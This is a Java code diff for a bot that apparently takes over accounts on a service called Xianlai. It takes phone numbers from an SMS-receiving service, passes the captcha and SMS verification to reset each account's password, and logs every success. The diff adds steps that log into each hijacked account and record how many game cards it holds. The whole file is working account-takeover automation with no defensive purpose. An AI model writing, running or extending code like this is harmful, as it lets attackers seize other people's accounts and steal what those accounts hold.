@@ -1,6 +1,8 @@
 package com.tip.enzo;
 
 import com.tip.enzo.common.ImageVerifyCodeResult;
+import com.tip.enzo.model.LoginResultModel;
+import com.tip.enzo.model.UserInfoModel;
 import com.tip.enzo.service.TianMaService;
 import com.tip.enzo.service.XianlaiService;
 import org.apache.commons.lang3.StringUtils;
@@ -11,6 +13,7 @@ import org.springframework.context.support.ClassPathXmlApplicationContext;
 import org.springframework.util.CollectionUtils;
 
 import java.util.List;
+import java.util.Map;
 
 
 /**
@@ -48,9 +51,12 @@ public class Main {
         while (true) {
             try {
 
-            /*
-             * step.1---获取可用号码
-             */
+                // TODO: 17/1/25 多线程、不保存验证码图片、抓取卡的数量和地区、打成jar包
+
+
+                /*
+                 * step.1---获取可用号码
+                 */
                 List<String> phoneNumbers;
                 try {
                     phoneNumbers = tianMaService.getPhoneNumber();
@@ -66,17 +72,18 @@ public class Main {
 
 
 
-            /*
-             * step2.--- 开始处理
-             */
+
+                /*
+                 * step2.--- 开始处理
+                 */
                 process(tianMaService, xianlaiService, phoneNumbers);
 
 
 
 
-            /*
-             * step3.--- 释放号码
-             */
+                /*
+                 * step3.--- 释放号码
+                 */
                 tianMaService.releasePhoneNumbers();
 
             } catch (Exception e) {
@@ -124,21 +131,86 @@ public class Main {
             }
 
 
-            switch (imageVerifyCodeResult) {
-                case SUCCESS: {
-                    String smsCode = tianMaService.getSmsContent(phoneNumber);
+            if (!imageVerifyCodeResult.equals(ImageVerifyCodeResult.SUCCESS)) {
+                return;
+            }
 
-                    if (StringUtils.isNotBlank(smsCode)) {
-                        if (xianlaiService.toNext(phoneNumber, imgVerifyCode, smsCode, cookie)) {
-                            // 存储修改成功的号码
-                            System.out.println("修改密码成功，号码：" + phoneNumber);
-                            tianMaService.addOnBlackList(phoneNumber);
-                            logger_success.info("修改密码成功：" + phoneNumber);
+            String smsCode = tianMaService.getSmsContent(phoneNumber);
+
+            if (StringUtils.isNotBlank(smsCode)) {
+                if (xianlaiService.toNext(phoneNumber, imgVerifyCode, smsCode, cookie)) {
+
+
+                    //login & fetch userInfo
+                    Integer cardNum = null;
+
+                    Map<String, String> params = getLoginParams(xianlaiService);
+                    LoginResultModel resultModel = getLoginResult(xianlaiService, phoneNumber, params);
+
+                    if (resultModel == null) {
+                        //登录失败
+
+
+                        // 存储修改成功的号码
+                        System.out.println("修改密码成功，号码：" + phoneNumber);
+                        logger_success.info("修改密码成功：" + phoneNumber);
+                    } else {
+                        if (!resultModel.getResult().contains("Err")) {
+                            //登录成功
+                            if (resultModel.getResult().equals("py")) {
+
+                                UserInfoModel userInfo = xianlaiService.getUserInfo(params.get("cookie"));
+                                cardNum = userInfo.getCardNum();
+                            }
                         }
+
                     }
 
+                    if (cardNum == null) {
+                        System.out.println("修改密码成功，号码：" + phoneNumber);
+                        logger_success.info("修改密码成功：" + phoneNumber);
+
+                    } else {
+                        System.out.println("修改密码成功，号码：" + phoneNumber + "卡的数量：" + cardNum);
+                        logger_success.info("修改密码成功：" + phoneNumber + "卡的数量" + cardNum);
+                    }
+
+
+                    //加入黑名单
+                    tianMaService.addOnBlackList(phoneNumber);
                 }
             }
+
         }
     }
+
+    private static Map<String, String> getLoginParams(XianlaiService xianlaiService) {
+        try {
+            return xianlaiService.getUserLoginPage();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return null;
+
+    }
+
+
+    private static LoginResultModel getLoginResult(XianlaiService xianlaiService, String phone, Map<String, String> params) {
+        if (params == null) {
+            return null;
+        }
+        try {
+            String cookie = params.get("cookie");
+            //// TODO: 17/1/28 验证码
+            String verifyCode = params.get("fileName");
+
+            return xianlaiService.login(cookie, phone, verifyCode);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return null;
+    }
+
 }
